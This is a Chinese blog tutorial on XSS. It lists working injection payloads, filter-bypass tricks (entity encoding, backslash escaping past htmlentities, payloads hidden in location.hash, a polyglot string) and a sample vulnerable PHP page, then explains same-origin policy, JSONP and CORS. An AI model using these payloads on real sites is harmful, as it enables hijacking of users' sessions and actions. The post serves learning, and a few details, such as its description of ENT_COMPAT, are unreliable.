<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zhangMini"><title>XSS · Mini's blog</title><meta name="description" content="XSS (Cross-Site Scripting，跨站脚本)XSS是代码注入的一种，通过注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但也可以包括Java、VBScript、ActiveX、Flash或者HTML。
时至今日，很多网站"><meta name="keywords" content="Security, life"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><meta name="generator" content="Hexo 6.3.0"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Mini's blog</a></h3><div class="description"><p>Nothing lasts forever.</p></div></div></div><ul class="social-links"></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a target="_blank" rel="noopener" href="https://www.caicai.me"> CaiCai </a><span>&</span><a target="_blank" rel="noopener" href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">tags</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img src="/images/favicon.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>XSS</a></h3></div><div class="post-content"><h1 id="XSS-Cross-Site-Scripting，跨站脚本"><a href="#XSS-Cross-Site-Scripting，跨站脚本" class="headerlink" title="XSS (Cross-Site Scripting，跨站脚本)"></a>XSS (Cross-Site Scripting，跨站脚本)</h1><p>XSS是代码注入的一种，通过注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但也可以包括Java、VBScript、ActiveX、Flash或者HTML。</p>
<p>时至今日，很多网站都给关键<strong>Cookie</strong>增加了<strong>HTTPOnly属性</strong>，这意味着执行JavaScript已无法获得用户的登录凭证，虽然<em>同源策略</em>限制了JavaScript跨域执行的能力，但是XSS攻击依然可以理解为在用户浏览器上的代码执行漏洞，可以在悄无声息的情况下实现模拟用户的操作（比如文件上传等请求）</p>
<h1 id="XSS漏洞类型"><a href="#XSS漏洞类型" class="headerlink" title="XSS漏洞类型"></a>XSS漏洞类型</h1><ul>
<li>反射型XSS：攻击具有一次性</li>
<li>存储型XSS：攻击代码永久的存在服务器的数据库或文件中</li>
<li>DOM型XSS：一种特殊类型的反射性XSS，它是基于DOM文档对象模型的一种漏洞。DOM XSS是页面中原有的JavaScript代码执行后，需要进行DOM树节点的增加或者元素的修改，引入了被污染的变量，从而导致XSS</li>
</ul>
<h1 id="XSS的tricks"><a href="#XSS的tricks" class="headerlink" title="XSS的tricks"></a>XSS的tricks</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(document.cookie)&quot;</span>&gt;</span>            //由于不存在路径为/x的图片，则会报错触发onerror事件</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">onmousemove</span>=<span class="string">&quot;alert(/XSS/)&quot;</span>&gt;</span>this is a title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>     //基本上所有的标签都可以使用on事件来触发恶意代码、</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>             //Javascript伪协议</span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4=&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span>      //除了Javascript伪协议外，还有其他伪协议可以在iframe标签中实现，例如data伪协议</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&quot;跳转的目的地址&quot;</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>                  //广告传播，跳转到目标地址</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>. location.<span class="title function_">replace</span>(<span class="string">&quot;跳转的目的地址&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>. location.<span class="title function_">assign</span>(<span class="string">&quot;跳转的目的地址&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">write(1)</span> <span class="attr">autofocus</span>&gt;</span>                  //h5特性的XSS</span><br></pre></td></tr></table></figure>

<h1 id="XSS过滤和绕过"><a href="#XSS过滤和绕过" class="headerlink" title="XSS过滤和绕过"></a>XSS过滤和绕过</h1><p>过滤的两个层为<em>WAF层</em>和<em>代码层</em>。<strong>WAF(Web Application Firewall,Web应用防火墙)</strong> 层通常在代码外，主机层对HTTP应用请求一个过滤拦截器。代码层则在代码中直接实现对用户输入的过滤或引用第三方代码对用户输入进行过滤</p>
<ul>
<li><p>利用burpsuit对payload进行实体编码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">scr</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span>&quot;</span> /&gt;</span>           </span><br></pre></td></tr></table></figure>
</li>
<li><p>如果过滤了Javascript的函数，如过滤“ <strong>eval(</strong> ”这种字符组合，那么就可以通过下面的方式绕过</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaa=<span class="built_in">eval</span></span><br><span class="line"><span class="title function_">aaa</span>(<span class="string">&quot;evil code&quot;</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>过滤引号但未过滤 <strong>“\“</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$name</span>,ENT_QUOTES);</span><br><span class="line">    <span class="variable">$address</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;addr&#x27;</span>];</span><br><span class="line">    <span class="variable">$address</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$address</span>,ENT_QUOTES);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;gb18030&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&#x27;http://null.com/?name=&lt;?=$name?&gt;&#x27;</span>+<span class="string">&#x27;&lt;?=$address?&gt;&#x27;</span>;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>输入点有两个，如果输入引号，会被编码成HTML实体字符，但是<strong>htmlentities</strong>函数并不会过滤 <strong>“\“</strong> ，所以我们可以通过 <strong>“\“</strong> 使得攻击语句逃逸：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://null.com/?name=name\&#x27;+&#x27;</span>;<span class="title function_">alert</span>(<span class="number">1</span>);<span class="comment">//&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在<strong>name</strong>处末尾输入 <strong>“\“</strong> ；在addr参数处闭合前面的Javascript语句，同时插入恶意代码。</p>
</li>
</ul>
<p>进一步还可以使用 <strong>eval(window.name)</strong> 引入恶意代码或者使用Javascript中的 <strong>String.fromCharCode</strong> （<em>见others</em>）来避免使用引号等被过滤的字符</p>
<ul>
<li>将payload藏在 <strong>location.hash</strong> 中</li>
</ul>
<p><em>见others</em></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080/xss/8.php?name=aaa\addr=;eval(unescape(location.hash.slice(1)));//#alert(&#x27;payload%20hide%20in%20hash&#x27;);</span><br></pre></td></tr></table></figure>
<p>将<strong>payload</strong>藏在 <strong>location.hash</strong>中，则URL中 “#” 后的字符不会被发到服务器中，所以不存在被服务器过滤的情况</p>
<ul>
<li>反引号当字符串的边界符</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080/xss/8.php?name=aaa\&amp;addr=p;alert(`反引号也可以用来作为边界符`);//</span><br></pre></td></tr></table></figure>
<h1 id="XSS常见payload"><a href="#XSS常见payload" class="headerlink" title="XSS常见payload"></a>XSS常见payload</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6003622.html">XSS payload大全</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//非常牛的一句payload</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jaVasCript</span>:<span class="comment">/*-/*`/*\`/*&#x27;/*&quot;/**/</span>(<span class="comment">/* */</span>oNcliCk=<span class="title function_">alert</span>() )<span class="comment">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h1><h2 id="JavaScript伪协议"><a href="#JavaScript伪协议" class="headerlink" title="JavaScript伪协议"></a>JavaScript伪协议</h2><p>JavaScript伪协议实际上是把<strong>javascript:</strong> 后面的代码当JavaScript来执行，并将结果值返回给当前页面</p>
<p>如果<strong>javascript:URL</strong> 中的代码含多个语句，必须使用分号将这些语句分隔开</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="keyword">var</span> now=<span class="keyword">new</span> <span class="title class_">Date</span>();<span class="string">&quot;&lt;h1&gt;the time is:&lt;/h1&gt;&quot;</span>+now;</span><br></pre></td></tr></table></figure>
<p>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同</p>
<p><strong>javascript URL</strong> 还可以只执行动作，不返回javascript语句</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="title function_">alert</span>(<span class="string">&quot;hello world!&quot;</span>)</span><br></pre></td></tr></table></figure>


<p>通常我们想用<strong>javascript:URL</strong>执行某些不改变当前显示的文档的javascript代码。要做到这一点，必须确保URL中的最后一条语句没有返回值。一种方法是用void运算符显式地把返回值指定为underfined，只需要在javascript:URL的结尾使用语句void 0;即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">javascript</span>:<span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;about:blank&quot;</span>); <span class="keyword">void</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>如果两个URL的<strong>protocol</strong>、<strong>port</strong>、<strong>host</strong>都相同的话，则这两个URL是同源的。</p>
<p>使用<strong>AJAX</strong>技术（XMLHttpRequest对象），从一个网页去请求另一个网页资源时，违反浏览器同源策略限制，所引起的安全问题，称为跨域</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://news.company.com:81/dir/other.html          //http:protocol;port:81;host:news       </span><br></pre></td></tr></table></figure>

<h3 id="有哪些不受同源策略的限制"><a href="#有哪些不受同源策略的限制" class="headerlink" title="有哪些不受同源策略的限制"></a>有哪些不受同源策略的限制</h3><ul>
<li>页面上的链接</li>
<li>重定向</li>
<li>表单提交</li>
<li>跨域资源的引入，比如：script、img、link、iframe</li>
</ul>
<h3 id="源的更改"><a href="#源的更改" class="headerlink" title="源的更改"></a>源的更改</h3><p>满足某些限制条件的情况下，页面是可以修改它的源。脚本可以将<strong>document.domain</strong>的值设置为其当前域或者当前域的<strong>父域</strong>。如果将其设置为其当前域的父域，则这个较短的父域将用于后续源检查</p>
<p>如，假设<em><a target="_blank" rel="noopener" href="http://store.company.com/dir/other.html">http://store.company.com/dir/other.html</a></em>文档中的一个脚本执行以下语句：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span> = <span class="string">&quot;company.com&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这条语句执行后，页面将会成功地通过与<em><a target="_blank" rel="noopener" href="http://company.com/dir/page.html">http://company.com/dir/page.html</a></em>的同源检测</p>
<p>端口号是由浏览器另行检查的。任何对<strong>document.domain</strong>的赋值操作，都会导致端口号被重写为<strong>null</strong></p>
<h3 id="解决跨域问题"><a href="#解决跨域问题" class="headerlink" title="解决跨域问题"></a>解决跨域问题</h3><ul>
<li>JSONP解决跨域</li>
<li>CORS解决跨域</li>
</ul>
<h4 id="JSONP解决跨域"><a href="#JSONP解决跨域" class="headerlink" title="JSONP解决跨域"></a>JSONP解决跨域</h4><p>什么是<strong>JSONP</strong>，举个例子，就是 <em>a.com&#x2F;jsonp.html</em> 想要获取 <em>b.com&#x2F;main.js</em> 的数据，这个时候由于浏览器同源策略，是获取不到数据的，所以我们可以在 <em>a.com&#x2F;jsonp.html</em> 创建一个 <em>script</em> 脚本，<em><a target="_blank" rel="noopener" href="http://b.com/main.js?callback=xxx">http://b.com/main.js?callback=xxx</a></em>。在<em>main.js</em>中调用这个<strong>回调函数</strong>xxx<em>，并且以</em>JSON数据形式作为参数传递，完成回调。代码如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.com/jsonp.html中的代码</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addScriptTag</span>(<span class="params">src</span>) &#123; </span><br><span class="line">   <span class="keyword">var</span> script = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>); </span><br><span class="line">   script.<span class="title function_">setAttribute</span>(<span class="string">&quot;type&quot;</span>,<span class="string">&quot;text/javascript&quot;</span>); </span><br><span class="line">   script.<span class="property">src</span> = src; </span><br><span class="line">   <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(script);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123; </span><br><span class="line">	<span class="title function_">addScriptTag</span>(<span class="string">&#x27;http://b.com/main.js?callback=foo&#x27;</span>);</span><br><span class="line">&#125; <span class="comment">//window.onload是为了让页面加载完成后再执行</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">data</span>) &#123; </span><br><span class="line">	    <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="property">name</span>+<span class="string">&quot;欢迎您&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">	 </span><br><span class="line"><span class="comment">//b.com/main.js中的代码</span></span><br><span class="line"><span class="title function_">foo</span>(&#123;<span class="attr">name</span>:<span class="string">&quot;hl&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<h5 id="存在的问题"><a href="#存在的问题" class="headerlink" title="存在的问题"></a>存在的问题</h5><ul>
<li>只能使用GET方式，无法使用POST方式</li>
<li>可能被注入恶意代码，篡改页面内容，可以采用字符串过滤来规避此问题</li>
</ul>
<h4 id="CORS解决跨域"><a href="#CORS解决跨域" class="headerlink" title="CORS解决跨域"></a>CORS解决跨域</h4><p>CORS是一个W3C标准，全称是“跨域资源共享”（Cross-origin resource sharing）</p>
<p>它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。</p>
<p>如在<em>b.com</em>里面添加响应头声明允许<em>a.com</em>的访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http://a.com</span><br></pre></td></tr></table></figure>
<p>然后<em>a.com</em>就可以用<strong>ajax</strong>获取<em>b.com</em>里的数据了。</p>
<h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>虽然浏览器限制了非同源网站不能直接访问，但是并没有对资源文件（如图片img，脚本script）进行限制，所以绕过这一层的方法就是，我们把api请求当作一个js文件引入，在服务端使用一层函数将返回数据包包裹成一行javascript代码</p>
<p>所以这个回调函数就是你和api方面约定好的一个名称。当你请求api时，他就会使用你提供的函数名称包装返回的数据，来去请求你约定的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getGPS</span>(<span class="params">data</span>)&#123;</span><br><span class="line">        <span class="comment">//do something for data</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span> = <span class="string">&quot;请求地址&amp;callback=getGPS&quot;</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>这样请求到的数据直接以getGPS（返回数据）的形式返回了回来，（返回数据）直接被当作实参传给了预写的函数（data）中作为实参。也就是说，此时的<strong>GPS(data) &#x3D; getGPS(‘返回数据’)</strong>,所以预写的函数直接被调用了</p>
<h2 id="String-fromCharCode"><a href="#String-fromCharCode" class="headerlink" title="String.fromCharCode()"></a>String.fromCharCode()</h2><p>将Unicode编码转为一个字符</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> n = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">72</span>,<span class="number">69</span>,<span class="number">76</span>,<span class="number">76</span>,<span class="number">79</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//输出结果：HELLO</span></span><br></pre></td></tr></table></figure>

<h2 id="location-hash"><a href="#location-hash" class="headerlink" title="location.hash"></a>location.hash</h2><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><p>url，如 <strong><a target="_blank" rel="noopener" href="http://www.test.com/#/something">http://www.test.com/#/something</a></strong></p>
<p>其中 <strong><a target="_blank" rel="noopener" href="http://www.test.com/">http://www.test.com</a></strong> 为真实的路径，而 <strong>#&#x2F;something</strong> 则为网页中的位置，称之为 <strong>锚点</strong></p>
<p>在访问<strong>锚点</strong>时会自动跳到锚点所在的网页位置，通常有两种方式作为锚点</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">name</span>=<span class="string">&quot;something&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">element</span> <span class="attr">id</span>=<span class="string">&quot;something&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">element</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>以上两种均可通过 <strong><a target="_blank" rel="noopener" href="http://www.test.com/#/something">http://www.test.com/#/something</a></strong> 使页面滚动到该元素的位置</p>
<h3 id="hash"><a href="#hash" class="headerlink" title="hash"></a>hash</h3><p>location.hash可读可写</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URL:http://www.test.com/#/something</span></span><br><span class="line">location.<span class="property">hash</span>;      <span class="comment">// 输出 #/something</span></span><br><span class="line">location.<span class="property">hash</span> = <span class="string">&#x27;#/test1&#x27;</span>;      <span class="comment">//http://www.test.com/#/test1</span></span><br></pre></td></tr></table></figure>
<p>在对hash写时要注意一个地方，如下所示：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//URL:http://www.test.com/</span></span><br><span class="line">location.<span class="property">hash</span> = <span class="string">&#x27;#/test&#x27;</span>    <span class="comment">//http://www.test.com/#/test</span></span><br><span class="line">location.<span class="property">hash</span> = <span class="string">&#x27;/#/test&#x27;</span>   <span class="comment">//http://www.test.com/#/#/test</span></span><br></pre></td></tr></table></figure>
<p>当写入的第一个字符不为 <strong>‘#’</strong> 时会自动地在字符串之前生成一个 <strong>‘#’</strong> ，再把字符串追加到生成的 <strong>#</strong> 后面</p>
<h3 id="onhashchange事件"><a href="#onhashchange事件" class="headerlink" title="onhashchange事件"></a>onhashchange事件</h3><p>在hash值发生变化后会触发该事件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onhashchange</span> = <span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="JS-反引号"><a href="#JS-反引号" class="headerlink" title="JS 反引号"></a>JS 反引号</h2><h3 id="字符串换行"><a href="#字符串换行" class="headerlink" title="字符串换行"></a>字符串换行</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> str = <span class="string">`this</span></span><br><span class="line"><span class="string">is a string`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br></pre></td></tr></table></figure>
<h3 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&quot;tom&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> str = <span class="string">`hey, <span class="subst">$&#123;name&#125;</span>, <span class="subst">$&#123;<span class="number">1</span>+<span class="number">1</span>&#125;</span>, <span class="subst">$&#123;<span class="built_in">Math</span>.random()&#125;</span>`</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(str)</span><br></pre></td></tr></table></figure>
<h3 id="调用函数"><a href="#调用函数" class="headerlink" title="调用函数"></a>调用函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = <span class="string">&#x27;zs&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> gender = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">myTagFunc</span>(<span class="params">strings</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(strings);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> str = myTagFunc<span class="string">`你好!<span class="subst">$&#123;name&#125;</span>是一个<span class="subst">$&#123;gender&#125;</span>`</span> ;</span><br></pre></td></tr></table></figure>

<h2 id="htmlentities"><a href="#htmlentities" class="headerlink" title="htmlentities()"></a>htmlentities()</h2><p>将所有适用的字符转换为HTML实体</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">htmlentities</span>(str,flags,character-set,<span class="keyword">double</span>-encode)</span><br></pre></td></tr></table></figure>

<ul>
<li>str - 要转换的字符串</li>
<li>flags<ul>
<li>ENT_COMPAT - 默认，仅编码单引号</li>
<li>ENT_QUOTES - 编码单引号和双引号</li>
<li>ENT_NOQUOTES - 不编码任何引号</li>
</ul>
</li>
<li>character-set - 要使用的字符集</li>
</ul>
<p>例子：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;Jane &amp; &#x27;Tarzan&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$str</span>, ENT_QUOTES);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>上面代码的HTML输出：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Jane <span class="symbol">&amp;amp;</span> &#x27;Tarzan&#x27;</span><br><span class="line">    Jane <span class="symbol">&amp;amp;</span> <span class="symbol">&amp;#039;</span>Tarzan<span class="symbol">&amp;#039;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
